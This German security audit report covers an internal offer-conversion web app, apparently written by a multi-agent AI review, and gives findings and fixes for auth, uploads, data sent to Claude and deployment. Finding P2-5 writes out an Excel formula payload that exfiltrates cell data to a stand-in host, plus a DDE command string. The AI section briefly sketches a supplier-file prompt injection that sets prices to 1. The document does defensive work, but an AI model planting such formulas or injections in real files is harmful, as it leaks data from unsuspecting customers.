# Security- & Architektur-Review — OfferConverterAMP

**Datum:** 2026-06-18 · **Prüfer:** Senior-Security-Review (Multi-Agent-Audit) · **Methode:** 8 Prüf-Dimensionen, jeder Befund einzeln adversarial gegengeprüft · **Modus:** nur Dokumentation (kein Code verändert).

---

## 1. Methodik

Das Review lief in zwei Stufen:

1. **Audit** — acht spezialisierte Prüfer lasen je einen Bereich (Auth, Authorization/IDOR, Upload-DoS, Prompt-Injection/Datenabfluss, XSS/Formel-Injektion, SSRF/XXE, Secrets/Deployment, Frontend/Architektur) und meldeten Befunde mit Ort, Angriffsszenario, Code-Beleg und Fix.
2. **Adversariale Verifikation** — jeder einzelne Befund wurde von einem zweiten, skeptischen Prüfer gegen den echten Code geprüft, mit dem expliziten Auftrag, ihn zu *widerlegen*. Severity wurde an die reale Lage der App kalibriert (intern, hinter Login, kleines vertrautes Team — kein öffentliches Angriffsfeld).

**Ergebnis der Verifikation:** Kein einziger Befund blieb bei P0/P1. Alle ursprünglich als „kritisch/hoch" eingestuften Punkte wurden auf **P2** heruntergestuft, weil sie Authentifizierung voraussetzen und kein Privilegien-übergreifendes oder anonymes Risiko darstellen. **Drei Befunde wurden vollständig widerlegt** (siehe §4.3).

### Severity-Legende

| Stufe | Bedeutung | Aktion |
|------|-----------|--------|
| **P0** | Kritisch, jetzt ausnutzbar, hoher Schaden | sofort |
| **P1** | Hoch | vor Public-Launch |
| **P2** | Mittel — real, aber durch Auth/internen Kontext gedämpft | zeitnah |
| **P3** | Niedrig / Hardening | Backlog |
| ✅ | Gut gelöst | — |

---

## 2. Gesamtbewertung

**Das Fundament ist solide.** Authentifizierung, Architektur-Trennung (Clean Architecture), XSS-Schutz der Vorschau und Secret-Hygiene sind auf einem Stand, den viele Produktiv-Apps nicht erreichen. Die echten Lücken sind **fehlende Guardrails**, keine Designfehler: Upload/Parsing ohne Limit, eine Stelle die den Sanitizer umgeht, Formel-Injektion in der erzeugten Excel, und ein paar Deployment-Härtungen (Root-Container, SECRET_KEY ohne Fail-Closed).

| Dimension | Note | Kernbefund |
|-----------|------|-----------|
| Auth & Session | **B+** | bcrypt/JWT sauber; `must_change_password` nur im UI erzwungen |
| Authorization / IDOR | **B** | Auth-Guard top; Ownership-Modell flach & inkonsistent |
| Input / Upload-DoS | **C** | kein Größenlimit, kein Zell-Limit, kein Schutz vor Zip-Bombe |
| Prompt-Injection / Datenabfluss | **C+** | Raw-Fallback umgeht den Sanitizer (Regelverstoß) |
| XSS / Formel-Injektion | **B** | Preview top; Formel-Injektion in erzeugter Excel offen |
| SSRF / XXE | **A−** | gut abgesichert; nur Rate-/Input-Limits fehlen |
| Secrets / Deployment | **B−** | Hygiene gut; Root-Container, Header & Fail-Closed fehlen |
| Frontend / Architektur | **A−** | keine DOM-XSS-Sinks; Dependency-Rule sauber |

**Befund-Bilanz:** 0× P0 · 0× P1 · **7× P2** · **24× P3** · 3 widerlegt · 22 als gut bestätigt.

---

## 3. Befund-Übersicht

### P2 — zeitnah angehen

| # | Befund | Ort |
|---|--------|-----|
| P2-1 | `must_change_password` nur clientseitig erzwungen | `api/auth.py:96-105`, `AuthGate.tsx:56-58` |
| P2-2 | Upload ohne Größenlimit → Memory-DoS | `api/routes.py:432-441` |
| P2-3 | xlsx-Parsing ohne Zell-/Zeilen-Limit, blockiert Event-Loop | `infrastructure/excel_reader.py:182-208,719-738` |
| P2-4 | Raw-Fallback sendet **ungesäubertes** Sheet an Claude | `api/routes.py:643-657` |
| P2-5 | Formel-Injektion in erzeugter Reseller-Excel | `infrastructure/excel_writer.py:297-303` |
| P2-6 | Container läuft als **root** | `Dockerfile:11-24` |
| P2-7 | `SECRET_KEY` ohne Fail-Closed in Prod | `config.py:41-54` |

### P3 — Hardening / Backlog

Auth: kein Login-Rate-Limit · Passwort-Policy (nur 8 Zeichen, nur API-Pfad, kein 72-Byte-Cap) · keine Token-Revocation · Login-Timing-Enumeration.
Authz: impliziter „Shared Archive" (undokumentiert) · inkonsistentes Ownership (nur Status) · Profile global mutierbar + Slug-Kollision · `file_id` ohne User-Bindung.
Upload: wiederholtes Voll-Reparsing pro Endpoint.
KI/Daten: Column-Mapper ungesäubert an Claude · Sanitizer erkennt keine Klartext-Namen + Telefon-Regex-Lücke · keine Output-Validierung der Extraktion · OpenRouter stilles Dritt-Routing.
XSS: Dateiname ungeprüft im `Content-Disposition`.
SSRF: kein EAN-Limit/Rate-Limit · EAN ohne URL-Encoding · ECB-XML interne Entity-Expansion.
Deployment: keine Security-Header/CSP · kein HEALTHCHECK · keine Resource-Limits · CORS-`*`-Default · Dependencies floor-gepinnt ohne Lockfile.
Frontend: JWT im `localStorage` · `routes.py` 945-Zeilen-God-Module.

---

## 4. Befunde im Detail

### 4.1 P2 — Mittel

---

#### P2-1 · `must_change_password` wird nur im Frontend erzwungen

**Ort:** `api/auth.py:96-105` & `:70-91`, `frontend/src/components/AuthGate.tsx:56-58`
**Severity:** P1 → **P2** (intern, kein Privilege-Crossing)

**Szenario:** Ein Operator legt per CLI ein Konto mit Temp-Passwort und `must_change=True` an. Der Nutzer *soll* bis zur Passwortänderung im Change-Screen gefangen sein. Aber `login()` gibt das JWT bedingungslos aus, und `get_current_user()` liest das Flag nie. Wer das React-UI umgeht (curl, Postman, gespeichertes Token), kann mit dem Temp-Passwort alle `/api/*`-Endpunkte nutzen. Das Gate ist serverseitig reine Kosmetik.

**Beleg:** `token = create_access_token(str(user.id))` (`auth.py:104`) ohne Flag-Prüfung; `get_current_user` prüft nur `user is None or not user.is_active` (`auth.py:89`). Einzige Durchsetzung: `AuthGate.tsx:56-57` (im Browser, trivial umgehbar).

**Fix:** Eigene Dependency, die `must_change_password` serverseitig durchsetzt — `/me` und `/change-password` ausgenommen.

```python
# api/auth.py
def require_password_changed(user: User = Depends(get_current_user)) -> User:
    if user.must_change_password:
        raise HTTPException(status.HTTP_403_FORBIDDEN, "Passwort muss zuerst geändert werden")
    return user
```
```python
# api/server.py — Schutz auf die App-Router legen (auth_router bleibt offen)
app.include_router(router, prefix="/api", dependencies=[Depends(require_password_changed)])
app.include_router(archive_router, prefix="/api", dependencies=[Depends(require_password_changed)])
```
**Aufwand:** S

---

#### P2-2 · Upload wird ohne Größenlimit komplett in den RAM gelesen

**Ort:** `api/routes.py:432-441`
**Severity:** P1 → **P2** (auth-gated; realistischer Auslöser ist versehentlich große Datei)

**Szenario:** `await file.read()` materialisiert den ganzen Body als ein `bytes`-Objekt — vor jeder Validierung. Dieselben Bytes liegen danach im `file_store` und werden bei jedem Folge-Endpunkt (map-columns, extract, remap, export) erneut geparst. Auf dem Single-Process-uvicorn (kein Worker-/Memory-Limit, kein Reverse-Proxy-Limit) kann eine sehr große Datei den Prozess OOM-killen → App für alle weg.

**Fix:** Größe am API-Rand streamend begrenzen und früh ablehnen.

```python
MAX_UPLOAD_BYTES = 25 * 1024 * 1024  # an reale Lieferantendateien anpassen

cl = file.headers.get("content-length")
if cl and cl.isdigit() and int(cl) > MAX_UPLOAD_BYTES:
    raise HTTPException(413, "Datei zu gross (max. 25 MB).")
chunks, total = [], 0
while data := await file.read(1024 * 1024):
    total += len(data)
    if total > MAX_UPLOAD_BYTES:
        raise HTTPException(413, "Datei zu gross (max. 25 MB).")
    chunks.append(data)
file_bytes = b"".join(chunks)
```
Zusätzlich `mem_limit` in docker-compose (s. P3) als Defense-in-Depth.
**Aufwand:** M

---

#### P2-3 · xlsx-Parsing ohne Zell-/Zeilen-Limit blockiert den Event-Loop

**Ort:** `infrastructure/excel_reader.py:182-208`, `:719-738`, `:702-710`
**Severity:** P1 → **P2**

**Szenario:** xlsx ist ein ZIP aus XML. Eine ~1 MB-Datei kann zu GB an Sheet-XML expandieren („billion laughs"-artig). `read_offer_file` lädt das ganze Workbook (`_unmerge_cells`), parst die Tabelle zweimal voll (`xl.parse(header=None)`/`header=header_row`) und scannt jede Zelle (`_detect_currency_from_formats`). **Wichtig:** `parse_offer` ist `async`, aber das Parsen läuft synchron im Handler — eine schwere Datei blockiert damit den **gesamten** Event-Loop, nicht nur einen Thread. Der HTML-Renderer cappt bereits auf 400×60 — der Reader hat kein Äquivalent.

**Fix:** Dimensionen vor dem Parsen gaten und Parsing auslagern.

```python
MAX_CELLS = 1_000_000
wb = openpyxl.load_workbook(io.BytesIO(file_bytes), read_only=True)
ws = wb[chosen]
if (ws.max_row or 0) * (ws.max_column or 0) > MAX_CELLS:
    wb.close(); raise ValueError("Datei zu gross / zu viele Zellen.")
wb.close()
# danach: xl.parse(chosen, header=None, nrows=MAX_ROWS)
```
Den Gate **vor** `_unmerge_cells` setzen (das lädt selbst das volle Workbook) und `_parse_file` in `run_in_threadpool` ausführen (wie der KI-Call in `routes.py:686`).
**Aufwand:** M

---

#### P2-4 · Raw-Fallback sendet das **ungesäuberte** Originalsheet an Claude — verletzt zwei Projektregeln

**Ort:** `api/routes.py:643-657`
**Severity:** P1 → **P2** (Empfänger ist ein vertraglicher KI-Dienst, B2B-Kontaktdaten)

**Szenario:** Wenn die Layout-Erkennung scheitert (`was_raw_fallback=True` — genau die problematischen Dateien), liest die Route das Workbook mit `header=None` neu (erste 100 Zeilen) und **stellt diesen Text dem Prompt voran** — ohne `sanitize_dataframe`. Lieferanten-Offerten tragen in den Kopfzeilen typischerweise Firmenname, Adresse, Telefon, Ansprechpartner, UID. Die Variable heisst zwar `sanitized_text`, der vorangestellte `raw_text` lief aber nie durch den Sanitizer. Das verstösst direkt gegen *„Sanitizer MUSS vor jedem API-Call laufen"* und *„Lieferantenname wird nie an die API gesendet"*.

**Fix (mehrstufig — der Regex-Pass allein genügt nicht):**

```python
if is_raw_fallback:
    df_truly_raw = xl_raw.parse(_sheet, header=None, dtype=str, nrows=100)
    df_truly_raw, _ = sanitize_dataframe(df_truly_raw)   # PII-Regex (E-Mail/Tel/IBAN/VAT)
    raw_text = df_truly_raw.fillna("").to_string(index=False, header=False)
    ...
```
Wichtig: Bei `header=None` greift das Spalten-Keyword-Dropping nicht (Spalten sind 0,1,2…), nur der Zell-Regex. Für die Regel *„Lieferantenname nie senden"* zusätzlich (a) die Titel-/Kontaktzeilen oberhalb der Header-Zeile abschneiden und/oder (b) Zellen, die exakt `supplier_name` matchen, schwärzen. Variable umbenennen (nicht mehr `sanitized_text`). Den Test `test_extract_raw_fallback_sends_raw_sheet_to_ai` anpassen.
**Aufwand:** M

---

#### P2-5 · Formel-Injektion in der erzeugten Reseller-Excel

**Ort:** `infrastructure/excel_writer.py:297-303` (Schreibpfad für Freitext-Felder)
**Severity:** P1 → **P2** (durch menschliche Prüfung + moderne Excel-Defaults gedämpft)

**Szenario:** Eine Lieferanten-Datei enthält im Produktnamen/Notizen eine Formel, z. B. `=HYPERLINK("http://evil.example/?x="&A1,"Rabatt")` oder ein DDE-`=cmd|'/c calc'!A1`. AMP lädt sie hoch, der Text wird unverändert in eine Zelle geschrieben, openpyxl speichert ihn als **echte Formel** (`data_type='f'`). Öffnet AMPs **Kunde** die Offerte, ist die Formel aktiv — Datenexfiltration per HYPERLINK-Klick, DDE-Prompt. Der Inhalt erreicht also unter AMPs Marke einen Dritten (Reputationsrisiko).

**Verifikations-Detail:** Empirisch wird in der openpyxl-Ausgabe **nur führendes `=`** zur Live-Formel; `+`, `-`, `@` landen als Strings. Das Defangen von `=` ist also tragend, der Rest ist Defense-in-Depth (CSV-Re-Export).

**Fix:** Formel-Trigger nur bei String-Freitextfeldern neutralisieren — **nicht** im gemeinsamen `_data_cell`-Helper (der schreibt auch die gewollten `=IF()`/SUM-Formeln!).

```python
_FORMULA_TRIGGERS = ("=", "+", "-", "@")

def _defang(value):
    if isinstance(value, str) and value and value[0] in _FORMULA_TRIGGERS:
        return "'" + value          # führendes Apostroph = Text in Excel
    return value
```
Im `else`-Datenzweig (≈ Zeile 301) auf `product_name/sku/ean/color/category/notes/extra_fields` anwenden, **niemals** auf `vk_target`/Summen/Mengen.
**Aufwand:** S

---

#### P2-6 · Container läuft als root

**Ort:** `Dockerfile:11-24` (kein `USER`)
**Severity:** **P2** (bestätigt — die App parst ständig nicht-vertrauenswürdige Dateien)

**Szenario:** uvicorn läuft als UID 0. Ein Speicherfehler in openpyxl/pandas/xlrd beim Parsen einer feindlichen Lieferanten-Datei würde als root ausgeführt — Container-Escape/Write-Primitive sind als root deutlich gefährlicher. Genau das Kerngeschäft (Parsen fremder Dateien) verstärkt dieses Risiko.

**Fix:**
```dockerfile
RUN useradd --create-home --uid 10001 appuser \
    && mkdir -p /app/data && chown -R appuser:appuser /app
USER appuser
```
Achtung Volume: `/app/data` ist ein Named Volume — Rechte werden nur bei leerem Volume vom Image übernommen; für bestehende Volumes `chown /app/data` per Entrypoint absichern.
**Aufwand:** S

---

#### P2-7 · `SECRET_KEY` fällt still auf einen Zufallsschlüssel zurück statt in Prod hart zu scheitern

**Ort:** `config.py:41-54`, `docker-compose.yml:14`
**Severity:** P1 → **P2** (Verfügbarkeits-/Betriebsproblem, **kein** Fälschungsrisiko — der Fallback ist 256-bit-CSPRNG)

**Szenario:** Fehlt `SECRET_KEY` (vergessen/leer in der Infomaniak-Umgebung), bootet die App trotzdem (nur WARN). Jeder Neustart/Redeploy erzeugt einen neuen `_DEV_SECRET` → alle Tokens ungültig, Nutzer unerklärlich ausgeloggt. Bei `>1` Worker akzeptiert Worker B keine Tokens von Worker A. `docker-compose` reicht `${SECRET_KEY}` als leeren String durch, falls nicht gesetzt → `not key` greift, Fallback aktiv.

**Fix:** Bei Nicht-Dev hart scheitern (Prod-sicher als Default).

```python
def secret_key() -> str:
    key = os.getenv("SECRET_KEY")
    if key:
        return key
    if os.getenv("APP_ENV", "production").lower() in ("dev", "local", "test"):
        logging.getLogger(__name__).warning("SECRET_KEY nicht gesetzt — ephemerer Dev-Key.")
        return _DEV_SECRET
    raise RuntimeError("SECRET_KEY muss in Produktion gesetzt sein.")
```
In `docker-compose.yml` zusätzlich `SECRET_KEY: ${SECRET_KEY:?SECRET_KEY muss gesetzt sein}` → scheitert schon beim Compose-Start.
**Aufwand:** S

---

### 4.2 P3 — Hardening / Backlog

**Auth**
- **Kein Login-Rate-Limit** (`auth.py:96-105`): unbegrenzte Versuche. Gemildert durch bcrypt-Kosten + interner Einsatz. Fix: `slowapi`-Limiter (z. B. `10/minute` pro IP) + optional Account-Lockout pro E-Mail. *(M)*
- **Passwort-Policy** (`auth.py:119-123`, `admin.py:31-49`): nur 8-Zeichen-Minimum, keine Komplexität, **kein 72-Byte-Cap**, und die Regel lebt nur im API-Change-Pfad — die CLI validiert gar nichts (1-Zeichen-Passwort möglich). >72 Byte ergibt API-seitig ein (englisches) 400, in der CLI einen unhandled Stacktrace. Fix: zentrales `validate_password(min 8, max 72 Byte)` in API **und** CLI. *(S)*
- **Keine Token-Revocation / Logout nur clientseitig** (`security.py:32-45`, `AuthGate.tsx:41-44`): geleaktes Token gilt bis `exp` (Default 12 h). Der `is_active`-Recheck pro Request ist ein User-Kill-Switch (gut!), aber pro-Token gibt es keinen. Fix: TTL senken (60-120 min) und/oder `jti` + Revoke-Liste. *(M)*
- **Login-Timing-Enumeration** (`application/auth.py:22-29`): bei unbekannter E-Mail kein bcrypt-Aufruf → Zeitunterschied verrät existierende Konten. Fix: Dummy-Hash über den `PasswordHasher`-Port verifizieren (Layering beachten). *(S)*

**Authorization**
- **Impliziter „Shared Archive"** (`archive_routes.py:200-281`): jeder eingeloggte User darf jede Offerte lesen/laden/previewen. Da `GET /offers` ohnehin alle listet, ist das *kein* Privilege-Crossing — aber undokumentiert und asymmetrisch zur Status-Owner-Prüfung. Fix: Entscheidung explizit dokumentieren (Modul-Kommentar) **oder** Ownership-Gate konsequent überall (dann auch `list`). *(M)*
- **Inkonsistentes Ownership** (`archive_routes.py:208-226`): nur `PATCH status` prüft `created_by_user_id`. Fix: ein kohärentes Modell wählen und in einen Helper faktorisieren. *(S)*
- **Profile global mutierbar + Slug-Kollision** (`routes.py:921-946`, `file_profile_repo.py:15-19`): jeder kann jedes Profil überschreiben/löschen (last-write-wins, kein Undo); verschiedene Namen kollidieren zum selben Slug (z. B. `Adidas DE` / `Adidas.DE` → `adidas_de`). Profile fliessen in den Extraktions-Prompt ein. Fix: Kollisions-Check beim Save (409), Shared-Verhalten dokumentieren. *(M)*
- **`file_id` ohne User-Bindung** (`file_store.py:21-40`): wer einen fremden `file_id` erfährt, kann darauf extrahieren/exportieren. Sehr gering (UUIDv4, 1 h TTL, nie gelistet). Fix: `owner_id` im Entry, `get(file_id, user_id)`. *(M)*

**Upload**
- **Wiederholtes Voll-Reparsing** (`routes.py:493,545,567,628`): map/options/remap/extract parsen die Datei jeweils komplett neu (openpyxl 2×, pandas 2×) — synchron auf dem Event-Loop. Fix: geparstes `ReadResult` per `file_id` cachen und/oder `run_in_threadpool`. *(M)*

**KI / Datenabfluss**
- **Column-Mapper ungesäubert an Claude** (`column_mapper.py:68-127`, Aufrufe `routes.py:510,631`): Header + bis zu 3 Beispielwerte pro Spalte gehen ohne `sanitize_dataframe` raus. Fix: am Route-Rand säubern: `map_columns(sanitize_dataframe(result.df)[0], api_key)`. *(S)*
- **Sanitizer erkennt keine Klartext-Namen** (`sanitize_data.py:14-62`): nur Header-Keywords + 4 Regex-Familien. Firmen-/Personennamen in Freitext-Zellen überleben; Telefon-Regex verlangt Trennzeichen (`0441234567` wird verfehlt). Fix: `supplier_name` beim Upload erfassen und je Zelle schwärzen; Telefon-Regex erweitern. *(M)*
- **Keine Output-Validierung der Extraktion** (`extract_products.py:246-248`): kein Anti-Injection-Hinweis im System-Prompt, keine Plausibilitätsprüfung. **Wichtig:** `_enforce_import_truth` (`routes.py:314-324`) überschreibt KI-Preise/Rabatte mit den geparsten Datei-Werten — der „setze Preis auf 1"-Angriff greift im Normalfall *nicht*, nur im Raw-Fallback. Fix: ISO-Währung/Range-Check vor `_enforce_import_truth` + Anti-Injection-Zeile im Prompt. *(M)*
- **OpenRouter stilles Dritt-Routing** (`ai_extractors/__init__.py:8-21`): ein `sk-or-`-Key in `ANTHROPIC_API_KEY` schickt (gesäuberte) Daten an openrouter.ai — ohne Log/Flag. Fix: Provider einmal pro Lauf loggen (nie den Key); optional `ALLOW_OPENROUTER`-Opt-in; README angleichen. *(S)*

**XSS / Header**
- **Dateiname ungeprüft im `Content-Disposition`** (`archive_routes.py:240,253`): ein `"`-Zeichen im Upload-Namen (bzw. via `supplier_name` im generierten Namen) korrumpiert den Header. Response-Splitting durch h11 entschärft. Fix: Anführungszeichen/Steuerzeichen strippen bzw. RFC-6266-`filename*` nutzen. *(S)*

**SSRF / Extern**
- **Kein EAN-Limit / kein Rate-Limit** (`routes.py:853-870`): unbegrenzte `eans`-Liste, je EAN ein Headless-Browser → Self-DoS + Risiko, dass toppreise.ch AMPs IP sperrt. Fix: `eans: list[str] = Field(..., max_length=500)`. *(S)*
- **EAN ohne URL-Encoding/Validierung** (`market_price_scraper.py:15,37`): Sonderzeichen verfälschen die Query (kein SSRF, da Host hartkodiert). Fix: `ean.isdigit()` + Länge 8-14 prüfen, `quote(ean)`. *(S)*
- **ECB-XML interne Entity-Expansion** (`ecb_rates.py:36`): stdlib-ElementTree blockt **externe** Entities (kein XXE/Datei-Read), erlaubt aber nested interne Expansion — nur bei kompromittiertem/MITM'tem Feed relevant. Fix: optional `defusedxml`. *(S)*

**Deployment**
- **Keine Security-Header / kein CSP** (`server.py:76-102`, `index.html`): kein HSTS, `X-Content-Type-Options`, `X-Frame-Options`/CSP. Da die Preview in `sandbox=""`-iframe via `srcDoc` läuft, ist der Preview-Pfad bereits sicher; relevant bleibt generisches Hardening (Clickjacking, MIME-Sniffing). Fix: kleine `@app.middleware`-Funktion mit `nosniff`/`X-Frame-Options: DENY`/CSP/`Referrer-Policy`. *(M)*
- **Kein HEALTHCHECK** (`Dockerfile`, `compose`): ein hängender-aber-lebender uvicorn wird nie recycelt. Fix: `HEALTHCHECK` auf `/health`. *(S)*
- **Keine Resource-Limits** (`docker-compose.yml`): `mem_limit`/`cpus`/`pids_limit` ergänzen. *(S)*
- **CORS-`*`-Default** (`server.py:68-82`): nur Warnung. Gemildert durch `allow_credentials=False` + Bearer-Auth. Fix: `or ["*"]`-Default entfernen (leere Allow-List statt offen) bzw. explizites Opt-in. *(S)*
- **Dependencies floor-gepinnt, kein Lockfile** (`requirements.txt`): `>=` ohne Obergrenze/Hashes → nicht reproduzierbare Builds, Supply-Chain-Risiko. Keine aktuell bekannte CVE. Fix: `pip-compile --generate-hashes`, `--require-hashes` im Dockerfile, `pip-audit`/Dependabot. *(M)*

**Frontend / Architektur**
- **JWT im `localStorage`** (`api.ts:16-31`): per XSS auslesbar. Da keine DOM-XSS-Sinks existieren, ist das heute kein Loch — aber das wertvollste Ziel. **Hinweis:** TTL ist real 12 h, nicht „kurz". Fix: TTL senken + CSP; langfristig httpOnly-Cookie (braucht CSRF-Schutz). *(M)*
- **`routes.py` 945-Zeilen-God-Module** (`routes.py:1-945`): mischt parse/map/extract/market/export; Code-Duplikate (Heuristik-Spalten-Ausschluss, Cache-Save). **Korrektur:** die ursprüngliche „Auth könnte vergessen werden"-Begründung trifft nicht zu — der Guard liegt zentral auf Router-Ebene (`server.py:88-89`). Fix: in Sub-Router aufteilen (wie `archive_routes.py`), Orchestrierung in Use-Cases. *(L)*

### 4.3 Widerlegt / Entwarnt (durch die Gegenprüfung gekippt)

| Ursprünglicher Befund | Warum widerlegt |
|----|----|
| Overposting via `created_by` (Excel-Header) | `created_by` ist ein **toter Parameter** — `build_excel` referenziert ihn nie; Firmenname/Adresse sind hartkodiert. Reine Code-Hygiene, kein Risiko. Archiv-Attribution kommt korrekt aus dem JWT. |
| Scraper „ohne Timeout" → hängt ewig | Scrapling `StealthyFetcher` hat einen **30-s-Default-Timeout**, der auch `network_idle` deckelt. Kein Hang/Thread-Exhaustion. |
| `VITE_API_URL` sendet Token im Klartext | Der dokumentierte Docker-Pfad backt `API=""` (same-origin) → Token läuft über die HTTPS-Origin. Footgun nur ausserhalb des dokumentierten Builds. Auf informativ herabgestuft. |

---

## 5. Was gut gelöst ist ✅

Diese Punkte wurden geprüft und ausdrücklich als gut bestätigt — sie sind das Fundament, auf dem die Fixes aufsetzen:

**Auth**
- bcrypt mit per-Passwort-Salt; `verify()` fängt kaputte Hashes ab (fail-closed).
- Generische Login-Fehlermeldung — keine „User existiert"-Preisgabe im Response-Body.
- HS256 fest gepinnt (`algorithms=["HS256"]`) → keine alg-confusion / kein `none`.
- `is_active`-Recheck **pro Request** (sofortiger Kill-Switch); `password_hash` nie in einer Response-Schema.
- Temp-Passwörter via CSPRNG (`secrets.token_urlsafe(9)`, ~72 bit).

**Authorization**
- Globaler Auth-Guard auf Router-Ebene — alle `/api/*` ausser `/login` geschützt; neue Endpunkte erben den Schutz automatisch.
- Archiv-Attribution an die JWT-Identität gebunden (kein Spoofing möglich).

**XSS / Injektion**
- Preview in **vollständig gesperrtem** `<iframe sandbox="">` (kein Script, keine same-origin) — selbst bei Escaping-Lücke kein Script im App-Origin.
- HTML-Renderer escaped **jeden** Zellwert + Blatt-Titel.
- CSS-Injektion via Zellfarbe **nicht** ausnutzbar (openpyxl validiert RGB als Hex).
- Path Traversal in Profilen vollständig verhindert (`_safe_filename`).
- Archiv-Suche SQL-injection-frei (ORM-Parametrisierung).

**SSRF / Extern**
- ECB-Fetch: 5-s-Timeout, TLS-Verify, statischer Fallback → kein Hang/Crash.
- Externe Call-Endpunkte auth-gated und fail-closed.

**Secrets / Deployment**
- Keine Secrets committed; `.gitignore` **und** `.dockerignore` schliessen `.env`/`data`/`*.db`/`node_modules`/`.git` korrekt aus.
- Secrets nur via Env, nie im Klartext geloggt (Warnungen nennen nur Präsenz).
- SQLite: WAL + Foreign-Keys + **kein** `echo` (kein SQL-Leak in Logs) + idempotente additive Mini-Migration.
- Static-SPA-Mount nach API-Routern → kein Shadowing, kein Path-Traversal (`html=True` ist Traversal-sicher).

**Architektur**
- Clean-Architecture-Dependency-Rule hält: `domain/` importiert nur stdlib, `application/` kein `infrastructure`/`api`.
- `pricing.py` rein und seiteneffektfrei (wie in CLAUDE.md gefordert).
- Token nie in URLs/Logs; zentrales 401-Handling.
- Geschichtete Test-Suite deckt Auth, Authz, Sanitizer und Renderer ab.

---

## 6. Prozess-Walkthroughs (zum Verstehen)

### 6.1 Upload → Export → Archiv

```
1. POST /api/offer/parse  (multipart)
   └─ await file.read()            ← ⚠ P2-2: kein Größenlimit
   └─ read_offer_file()            ← ⚠ P2-3: voll geparst, synchron, kein Zell-Limit
   └─ sanitize_dataframe()         ← ✅ entfernt PII-Spalten + schwärzt Regex-PII
   └─ file_store.put() → file_id   ← UUIDv4, 1 h TTL, ⚠ P3: keine User-Bindung

2. (optional) POST /api/offer/map-columns | /extract
   └─ map_columns(result.df)       ← ⚠ P3: ungesäuberte Header+Samples an Claude
   └─ bei Raw-Fallback: RAW SHEET  ← ⚠ P2-4: UNGESÄUBERT an Claude (Regelverstoß)
   └─ _enforce_import_truth()      ← ✅ KI-Preise werden durch Datei-Werte ersetzt

3. POST /api/offer/export
   └─ enrich_dataframe()           ← ✅ pure pricing-Funktionen
   └─ build_excel()                ← ⚠ P2-5: Lieferanten-Freitext = Formel beim Kunden
   └─ SqlOfferRepository.create()  ← ✅ created_by aus JWT (kein Spoofing)
   └─ Response + X-Offer-Id
```

**Lernpunkt:** Der Sanitizer ist die zentrale Trust-Boundary zwischen „Lieferantendaten" und „externe API". Er läuft im Normalpfad korrekt — aber **eine** Abzweigung (Raw-Fallback, P2-4) und **eine** Nebenroute (Column-Mapper, P3) umgehen ihn. Das ist das Muster, auf das man bei „Sanitizer vor jedem API-Call" achten muss: nicht *ob* er existiert, sondern ob *jeder* Pfad ihn trifft.

### 6.2 Login → JWT → Guard

```
1. POST /api/auth/login {email, password}
   └─ AuthService.authenticate()   ← ⚠ P3: kein bcrypt bei unbekannter Mail (Timing)
   └─ bcrypt.checkpw()             ← ✅ langsam by design
   └─ create_access_token(user.id) ← ⚠ P2-1: ignoriert must_change_password
        HS256, sub/iat/exp, 12 h    ← ✅ alg gepinnt | ⚠ P3: 12 h ist lang

2. Jeder /api/*-Request
   └─ HTTPBearer → get_current_user ← ✅ Guard auf Router-Ebene (server.py:88-89)
   └─ decode_access_token()        ← ✅ algorithms=["HS256"], PyJWTError → 401
   └─ Repo.get_by_id(sub)
   └─ user.is_active?              ← ✅ Kill-Switch pro Request
        (must_change_password?)    ← ⚠ P2-1: wird hier NICHT geprüft

3. Frontend
   └─ Token in localStorage        ← ⚠ P3: XSS-auslesbar (aber keine XSS-Sinks)
   └─ 401 → Token löschen + Login   ← ✅ zentrales Handling
```

**Lernpunkt:** Das Modell ist „stateless JWT + frischer DB-Recheck pro Request". Der DB-Recheck ist die elegante Stelle — er macht das Token *nicht* blind vertrauenswürdig und gibt einen User-Kill-Switch. Genau dort gehört auch die `must_change_password`-Prüfung hin (P2-1).

---

## 7. Priorisierter Maßnahmenplan

**Sprint 1 (Sofort, hoher Wert / geringer Aufwand)**
1. P2-4 — Sanitizer im Raw-Fallback (Regelverstoß, S-M)
2. P2-5 — `_defang` für Freitext-Felder in der Excel-Ausgabe (S)
3. P2-1 — `require_password_changed`-Dependency (S)
4. P2-7 — `SECRET_KEY` Fail-Closed + `compose ${VAR:?}` (S)
5. P2-6 — `USER appuser` im Dockerfile (S)

**Sprint 2 (Guardrails)**
6. P2-2 / P2-3 — Upload-Größenlimit + Zell-Gate + `run_in_threadpool` (M)
7. Login-Rate-Limit + EAN-`max_length` (S)
8. Security-Header-Middleware + `mem_limit`/HEALTHCHECK (M)

**Backlog (Hygiene)**
9. Column-Mapper säubern, Output-Validierung, OpenRouter-Logging
10. Dependency-Lockfile + `pip-audit`/Dependabot
11. Ownership-Modell vereinheitlichen + dokumentieren; `routes.py` aufteilen
12. TTL senken / `defusedxml` / Profil-Kollisions-Check / Dateinamen-Sanitisierung

---

*Erstellt durch ein adversarial verifiziertes Multi-Agent-Review (46 Agenten). Severity ist an den realen Kontext kalibriert: interne, authentifizierte App, kleines vertrautes Team. Kein Code wurde verändert.*
